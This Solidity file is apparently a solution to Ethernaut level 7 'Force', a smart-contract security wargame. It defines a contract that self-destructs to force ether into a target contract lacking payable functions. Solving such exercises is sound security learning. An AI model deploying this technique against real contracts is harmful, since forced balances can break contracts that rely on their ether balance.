// # Ethernaut 7: Force

pragma solidity ^0.6.0;

contract ForceAttack {
    constructor () payable public {}

    // One way of forcing ether upon a contract which does not have a payable
    // `fallback` or `receive` function is to self-destruct specifying the target
    // contract as recipient of any remaining ether.
    function forceSendEther (address target) public {
        selfdestruct(payable(target));
    }
}
